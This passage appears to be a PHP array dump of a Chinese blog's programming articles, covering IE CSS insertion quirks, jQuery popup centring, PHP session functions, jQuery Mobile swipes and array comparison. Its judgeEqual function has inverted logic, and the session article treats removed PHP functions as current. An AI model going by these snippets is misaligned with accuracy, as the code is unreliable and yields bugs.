&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;s=document.createElement(&quot;style&quot;);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;head=document.getElementsByTagName(&quot;head&quot;).item(0);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;link=document.getElementsByTagName(&quot;link&quot;);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;link=link.item(0);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(is_ie)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(link)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head.insertBefore(s,link);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head.appendChild(s);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;document.styleSheets.item(document.styleSheets.length-1).cssText=cssStr;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;if(is_ch)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;t=document.createTextNode();&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;t.nodeValue=cssStr;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.appendChild(t);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head.insertBefore(s,link);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;s.innerHTML=cssStr;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;head.insertBefore(s,link);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;})();&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;//--&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;/script&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/head&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;body&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&lt;h3&gt;在IE中我是绿色，非IE浏览器下我是蓝色！&lt;/h3&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/body&gt;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/html&gt;</pre><p style=\\"line-height: 20px;\\"><strong>结果</strong>：<span style=\\"color:#ff0000\\">在Firefox / Chrome / Safari / Opera 中，文字都是蓝色的。而</span><span style=\\"color:#ff0000\\">在IE 浏览器中，文字却是绿色的。</span> </p><p style=\\"line-height: 35px;\\">&nbsp;</p><p><span style=\\"color:#ff0000;font-size:16px\\"><strong>附加</strong></span></p><p><span style=\\"font-size:16px\\">在IE 中添加样式内容的JavaScript 代码：</span></p><pre class=\\"brush:html;toolbar:false\\">var&nbsp;s=document.createElement(&quot;style&quot;);&nbsp;&nbsp;&nbsp;&nbsp;
var&nbsp;head=document.getElementsByTagName(&quot;head&quot;).item(0);&nbsp;&nbsp;&nbsp;&nbsp;
var&nbsp;link=document.getElementsByTagName(&quot;link&quot;).item(0);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
head.insertBefore(s,link);&nbsp;&nbsp;&nbsp;&nbsp;
/*&nbsp;注意：在IE&nbsp;中，&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;虽然代码是将&lt;style&gt;插入在&lt;link&gt;之前，&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;但实际内存中，&lt;style&gt;却在&lt;link&gt;之后。&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;这也是“IE中奇怪的应用CSS的BUG”之所在！&nbsp;&nbsp;&nbsp;&nbsp;
*/&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
var&nbsp;oStyleSheet&nbsp;=&nbsp;document.styleSheets[0];&nbsp;&nbsp;&nbsp;&nbsp;
//这实际是在&lt;link&gt;的外部样式中追加&nbsp;&nbsp;&nbsp;&nbsp;
oStyleSheet.addRule(&quot;h3&quot;,&quot;color:green;&quot;);&nbsp;&nbsp;&nbsp;&nbsp;
alert(oStyleSheet.rules[0].style.cssText);&nbsp;&nbsp;&nbsp;&nbsp;
alert(document.styleSheets[0].rules[0].style.cssText);&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
//方式2&nbsp;&nbsp;&nbsp;&nbsp;
var&nbsp;cssStr=&quot;h3&nbsp;{color:green;}&quot;;&nbsp;&nbsp;&nbsp;&nbsp;
document.styleSheets.item(document.styleSheets.length-1).cssText=cssStr;</pre><p><span style=\\"font-size:16px\\"><strong><span style=\\"color:#ff0000\\">IE 浏览器下载或者渲染的顺序可能如下：</span></strong> </span> </p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">IE 下载的顺序是从上到下；</span></p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">JavaScript 函数的执行会阻塞IE 的下载；</span></p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">IE 渲染的顺序也是从上到下；</span></p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">IE 的下载和渲染是同时进行的； </span></p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">在渲染到页面的某一部分时，其上面的所有部分都已经下载完成（但并不是说所有相关联的元素都已经下载完。） </span> </p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">在下载过程中，如果遇到某一标签是嵌入文件，并且文件是具有语义解释性的（例如：JS脚本，CSS样式），那么此时IE的下载过程会启用单独连接进行下载。并且在下载后进行解析，如果JS、CSS中如有重定义，后面定义的函数将覆盖前面定义的函数。 </span> </p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">解析过程中，停止页面所有往下元素的下载。样式表文件比较特殊，在其下载完成后，将和以前下载的所有样式表一起进行解析，解析完成后，将对此前所有元素（含以前已经渲染的）重新进行样式渲染。并以此方式一直渲染下去，直到整个页面渲染完成。 </span> </p><p>●&nbsp;&nbsp; <span style=\\"font-size:16px\\">Firefox 处理下载和渲染的顺序大体相同，只是在细微之处有些差别，例如：iframe 的渲染。</span> </p><p><br/></p><p>文章转自：http://www.cnblogs.com/xugang/archive/2010/09/24/1833760.html<br/></p>',
            'keyword' => 'CSS,优先级',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:16:12',
          ),
          21 => 
          array (
            'id' => '64',
            'uid' => '1',
            'title' => 'JQuery 弹出层，始终显示在屏幕正中间',
            'content' => '<p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Helvetica,Tahoma,Arial,sans-serif; font-size:14px; line-height:25px; text-align:left\\">1.让层始终显示在屏幕正中间：</p><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Helvetica,Tahoma,Arial,sans-serif; font-size:14px; line-height:25px; text-align:left\\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 样式代码：</p><pre class=\\"brush:css;toolbar:false\\">.model{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;position:&nbsp;absolute;&nbsp;z-index:&nbsp;1003;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;width:320px;&nbsp;height:320px;&nbsp;text-align:center;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;background-color:#0066FF;&nbsp;display:&nbsp;none;&nbsp;&nbsp;
}</pre><p>jquery代码：</p><pre class=\\"brush:js;toolbar:false\\">//让指定的DIV始终显示在屏幕正中间&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;letDivCenter(divName){&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;top&nbsp;=&nbsp;($(window).height()&nbsp;-&nbsp;$(divName).height())/2;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;left&nbsp;=&nbsp;($(window).width()&nbsp;-&nbsp;$(divName).width())/2;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;scrollTop&nbsp;=&nbsp;$(document).scrollTop();&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;scrollLeft&nbsp;=&nbsp;$(document).scrollLeft();&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(divName).css(&nbsp;{&nbsp;position&nbsp;:&nbsp;&#39;absolute&#39;,&nbsp;&#39;top&#39;&nbsp;:&nbsp;top&nbsp;+&nbsp;scrollTop,&nbsp;left&nbsp;:&nbsp;left&nbsp;+&nbsp;scrollLeft&nbsp;}&nbsp;).show();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}</pre><p>html代码：</p><pre class=\\"brush:html;toolbar:false\\">&lt;a&nbsp;href=&quot;javascript:;&quot;&nbsp;onclick=&quot;letDivCenter(&#39;#model&#39;)&quot;&gt;点我让DIV始终显示在屏幕中间&lt;/a&gt;&lt;br&nbsp;/&gt;&nbsp;&nbsp;
&lt;div&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;id=&quot;model&quot;&nbsp;class=&quot;model&quot;&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是内容（不过没有垂直居中显示）希望各位高手，能够补充。小弟在此谢过了。&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;&nbsp;&nbsp;
&lt;/div&gt;</pre><p style=\\"margin-top:0px; margin-bottom:0px; padding-top:0px; padding-bottom:0px; font-family:Helvetica,Tahoma,Arial,sans-serif; font-size:14px; line-height:25px; text-align:left\\">运行一下看看效果吧。<br/>接下来总结一下，将它们整合成一个。即，当弹出ｄｉｖ层的时候，同时也要弹出遮罩层，好，废话不多说，看代码：<br/><br/>１。ＣＳＳ样式：</p><pre class=\\"brush:css;toolbar:false\\">&lt;style&nbsp;type=&quot;text/css&quot;&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;.mask&nbsp;{&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;position:&nbsp;absolute;&nbsp;top:&nbsp;0px;&nbsp;filter:&nbsp;alpha(opacity=60);&nbsp;background-color:&nbsp;#777;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;z-index:&nbsp;1002;&nbsp;left:&nbsp;0px;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;opacity:0.5;&nbsp;-moz-opacity:0.5;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;.model{&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;position:&nbsp;absolute;&nbsp;z-index:&nbsp;1003;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;width:320px;&nbsp;height:320px;&nbsp;text-align:center;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;background-color:#0066FF;&nbsp;display:&nbsp;none;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
&lt;/style&gt;</pre><p>２。Ｊquery代码：</p><pre class=\\"brush:js;toolbar:false\\">&lt;script&nbsp;type=&quot;text/javascript&quot;&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//兼容火狐、IE8&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;showMask(){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&quot;#mask&quot;).css(&quot;height&quot;,$(document).height());&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&quot;#mask&quot;).css(&quot;width&quot;,$(document).width());&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(&quot;#mask&quot;).show();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;//让指定的DIV始终显示在屏幕正中间&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;letDivCenter(divName){&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;top&nbsp;=&nbsp;($(window).height()&nbsp;-&nbsp;$(divName).height())/2;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;left&nbsp;=&nbsp;($(window).width()&nbsp;-&nbsp;$(divName).width())/2;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;scrollTop&nbsp;=&nbsp;$(document).scrollTop();&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;scrollLeft&nbsp;=&nbsp;$(document).scrollLeft();&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$(divName).css(&nbsp;{&nbsp;position&nbsp;:&nbsp;&#39;absolute&#39;,&nbsp;&#39;top&#39;&nbsp;:&nbsp;top&nbsp;+&nbsp;scrollTop,&nbsp;left&nbsp;:&nbsp;left&nbsp;+&nbsp;scrollLeft&nbsp;}&nbsp;).show();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;showAll(divName){&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;showMask();&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;letDivCenter(divName);&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;&nbsp;
&lt;/script&gt;</pre><p>3.HTML代码：</p><pre class=\\"brush:html;toolbar:false\\">&lt;div&nbsp;id=&quot;mask&quot;&nbsp;class=&quot;mask&quot;&gt;&lt;/div&gt;&nbsp;&nbsp;
&lt;a&nbsp;href=&quot;javascript:;&quot;&nbsp;onclick=&quot;showMask()&quot;&nbsp;&gt;点我显示遮罩层&lt;/a&gt;&lt;br&nbsp;/&gt;&nbsp;&nbsp;
&lt;a&nbsp;href=&quot;javascript:;&quot;&nbsp;onclick=&quot;letDivCenter(&#39;#model&#39;)&quot;&gt;点我让DIV始终显示在屏幕中间&lt;/a&gt;&lt;br&nbsp;/&gt;&nbsp;&nbsp;
&lt;a&nbsp;href=&quot;javascript:;&quot;&nbsp;onclick=&quot;showAll(&#39;#model&#39;)&quot;&gt;点我显示所有&lt;/a&gt;&lt;br&nbsp;/&gt;&nbsp;&nbsp;
&lt;div&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;div&nbsp;id=&quot;model&quot;&nbsp;class=&quot;model&quot;&gt;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这是内容（不过没有垂直居中显示）希望各位高手，能够补充。小弟在此谢过了。&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;/div&gt;&nbsp;&nbsp;
&lt;/div&gt;</pre><p><br/></p>',
            'keyword' => 'JQuery,弹出层,中间',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:13:33',
          ),
          22 => 
          array (
            'id' => '63',
            'uid' => '1',
            'title' => 'PHP会话处理相关函数介绍',
            'content' => '<p><span style=\\"color:#000000\\"><strong>[导读]</strong></span> 在PHP开发中,比起Cookie，Session 是存储在服务器端的会话，相对安全，并且不像 Cookie 那样有存储长度限制，这里我们详细介绍一下PHP处理会话函数将要用到10个函数。</p><p>在PHP开发中,比起Cookie，Session 是存储在服务器端的会话，相对安全，并且不像 Cookie 那样有存储长度限制，这里我们详细介绍一下PHP处理会话函数将要用到10个函数。<br/><br/><img alt=\\"\\\\\\" src=\\"http://www.php100.com/uploadfile/2015/0322/20150322033941246.jpg\\" style=\\"height: 194px; width: 574px\\"/></p><p><br/><strong>PHP处理会话函数1、 session_start</strong></p><p>函数功能：开始一个会话或者返回已经存在的会话。<br/>函数原型：boolean session_start(void);<br/>返回值：布尔值<br/>功能说明：这个函数没有参数，且返回值均为true。最好将这个函数置于最先，而且在它之前不能有任何输出，否则会报警，如：Warning: 
Cannot send session cache limiter – headers already sent (output started
 at /usr/local/apache/htdocs/cga/member/1.php:2) in 
/usr/local/apache/htdocs/cga/member/1.php on line 3<br/>&nbsp;</p><p><strong>PHP处理会话函数2、 session_register</strong></p><p>函数功能：登记一个新的变量为会话变量<br/>函数原型：boolean session_register(string name);<br/>返回值：布尔值。<br/>功能说明：这个函数是在全局变量中增加一个变量到当前的SESSION中，参数name就是想要加入的变量名，成功则返回逻辑值true。可以用$_SESSION[name]或$HTTP_SESSION_VARS[name]的形式来取值或赋值。<br/>&nbsp;</p><p><strong>PHP处理会话函数3、 session_is_registered</strong></p><p>函数功能：检查变量是否被登记为会话变量。<br/>函数原型：boobean session_is_registered(string name);<br/>返回值：布尔值<br/>功能说明：这个函数可检查当前的session之中是否已有指定的变量注册，参数name就是要检查的变量名。成功则返回逻辑值true。<br/>&nbsp;</p><p><strong>PHP处理会话函数4、 session_unregister</strong></p><p>函数功能：删除已注册的变量。<br/>函数原型：boolean session_session_unregister(string name);<br/>返回值：布尔值<br/>功能说明：这个函数在当前的session之中删除全局变量中的变量。参数name就是欲删除的变量名，成功则返回true。<br/>&nbsp;</p><p><strong>PHP处理会话函数5、 session_destroy</strong></p><p>函数功能：结束当前的会话，并清空会话中的所有资源。<br/>函数原型：boolean session destroy(void);<br/>返回值：布尔值。<br/>功能说明：这个函数结束当前的session，此函数没有参数，且返回值均为true。<br/>&nbsp;</p><p><strong>PHP处理会话函数6、 session_encode</strong></p><p>函数功能：sesssion信息编码<br/>函数原型：string session_encode(void);<br/>返回值：字符串<br/>功能说明：返回的字符串中包含全局变量中各变量的名称与值，形式如：a|s:12:”it is a test”;c|s:4:”lala”; a是变量名 s:12代表变量a的值”it is a test的长度是12 变量间用分号”;”分隔。<br/>&nbsp;</p><p><strong>PHP处理会话函数7、 session_decode</strong></p><p>函数功能：sesssion信息解码<br/>函数原型：boolean session_decode (string data)<br/>返回值：布尔值<br/>功能说明：这个函数可将session信息解码，成功则返回逻辑值true。<br/>&nbsp;</p><p><strong>PHP处理会话函数8、 session_name</strong></p><p>函数功能：存取当前会话名称<br/>函数原型：boolean session_name(string [name]);<br/>返回值：字符串<br/>功能说明：这个函数可取得或重新设置当前session的名称。若无参数name则表示获取当前session名称，加上参数则表示将session名称设为参数name。<br/>&nbsp;</p><p><strong>PHP处理会话函数9、 session_id</strong></p><p>函数功能：存取当前会话标识号<br/>函数原型：boolean session_id(string [id]);<br/>返回值：字符串<br/>功能说明：这个函数可取得或重新设置当前存放session的标识号。若无参数id则表示只获取当前session的标识号，加上参数则表示将session的标识号设成新指定的id。<br/>&nbsp;</p><p><strong>PHP处理会话函数10、 session_unset</strong></p><p>函数功能：删除所有已注册的变量。<br/>函数原型：void session_unset (void)<br/>返回值：布尔值<br/>功能说明：这个函数和Session_destroy不同，它不结束会话。就如同用函数session_unregister逐一注销掉所有的会话变量。</p><p><br/></p><p>原文地址：<a target=\\"_blank\\" href=\\"http://www.php100.com/html/dujia/2015/0320/8827.html###\\">http://www.php100.com/html/dujia/2015/0320/8827.html</a><br/></p>',
            'keyword' => 'PHP,会话处理',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:10:36',
          ),
          23 => 
          array (
            'id' => '62',
            'uid' => '1',
            'title' => 'Jquery Mobile左右滑动效果',
            'content' => '<p>首先，页面里有两个&lt;div data-role=&quot;page&quot;&gt;，捡重点的写是，省掉其中的header和footer,这样：</p><pre class=\\"brush:html;toolbar:false\\">//第一页面
&lt;div&nbsp;data-role=&quot;page&quot;&nbsp;id=&quot;index&quot;&gt;
&lt;div&nbsp;data-role=&quot;content&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&nbsp;data-role=&quot;listview&quot;&nbsp;id=&quot;circle-news-list&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;第一个列表&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/div&gt;
&lt;/div&gt;
//第二页面
&lt;div&nbsp;data-role=&quot;page&quot;&nbsp;id=&quot;class-page&quot;&gt;
&lt;div&nbsp;data-role=&quot;content&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;ul&nbsp;data-role=&quot;listview&quot;&nbsp;id=&quot;class-news-list&quot;&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&lt;!--&nbsp;第二个列表&nbsp;--&gt;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;/ul&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&lt;/div&gt;
&lt;/div&gt;</pre><p>接下来通过jquery mobile 中的swipe事件还执行左右滑动效果：</p><pre class=\\"brush:js;toolbar:false\\">&lt;script&gt;
$(function(){
&nbsp;&nbsp;&nbsp;&nbsp;$(&quot;#circle-news-list&quot;).bind(&quot;swipeleft&quot;,function(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.mobile.changePage(&quot;#class-page&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;});
&nbsp;&nbsp;&nbsp;&nbsp;$(&quot;#class-news-list&quot;).bind(&quot;swiperight&quot;,function(){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$.mobile.changePage(&quot;#index&quot;,&nbsp;{transition:&quot;slide&quot;,reverse:true},&nbsp;true,&nbsp;true);
&nbsp;&nbsp;&nbsp;&nbsp;});
});
&lt;/script&gt;</pre><p>这里，从左往右比较容易，默认的slide就可以了，从右往左是关键，默认的切换效果还是会从左往右，所以要加上</p><p>reverse:true,这样就可以实现左右切换了~</p><p>&nbsp;来自：http://designicu.com/jquery-mobile-swipe/</p><p><br/></p>',
            'keyword' => 'Jquery,Mobile,滑动效果',
            'sortid' => '7',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:08:39',
          ),
          24 => 
          array (
            'id' => '61',
            'uid' => '1',
            'title' => '判断php两个数组是否完全相等',
            'content' => '<pre class=\\"brush:php;toolbar:false\\">function&nbsp;judgeEqual($key1,$key2){
&nbsp;&nbsp;&nbsp;if(array_diff($key1,$key2)&nbsp;||&nbsp;array_diff($key2,$key1)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;true;
&nbsp;&nbsp;&nbsp;}else{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;false;
&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;
}					
		</pre><p><br/></p>',
            'keyword' => 'php,数组,相等',
            'sortid' => '1',
            'img' => '',
            'views' => '0',
            'comnum' => '0',
            'topway' => 'none',
            'status' => 'show',
            'datetime' => '2015-09-21 16:07:30',
          ),
          25 => 
          array (
            'id' => '60',
            'uid' => '1',
            'title' => 'setInterval和setTimeout停止的方法',
            'content' => '<p>要想知道它们是怎么停止的，首先我们要了解它们的运行机制和原理，下面是具体的介绍。</p><p>先来了解 setInterval : <br/><strong>1,HTML DOM setInterval() 方法</strong> <br/>定义和用法 <br/>setInterval() 方法可按照指定的周期（以毫秒计）来调用函数或计算表达式。 <br/>setInterval() 方法会不停地调用函数，直到 clearInterval() 被调用或窗口被关闭。由 setInterval() 返回的 ID 值可用作 clearInterval() 方法的参数。 <br/>语法 <br/>setInterval(code,millisec[,&quot;lang&quot;]) <br/>参数 描述 <br/>code 必需。要调用的函数或要执行的代码串。 <br/>millisec 必须。周期性执行或调用 code 之间的时间间隔，以毫秒计。 <br/>返回值 <br/>一个可以传递给 Window.clearInterval() 从而取消对 code 的周期性执行的值。 <br/><strong>2,HTML DOM clearInterval()方法</strong> <br/>定义和用法 <br/>clearInterval() 方法可取消由 setInterval() 设置的 timeout。 <br/>clearInterval() 方法的参数必须是由 setInterval() 返回的 ID 值。 <br/>语法 <br/>clearInterval(id_of_setinterval) <br/>参数 描述 <br/>id_of_setinterval 由 setInterval() 返回的 ID 值。 <br/>如何停止： <br/>下面这个例子将每隔 50 毫秒调用 clock() 函数。您也可以使用一个按钮来停止这个 clock：</p><pre 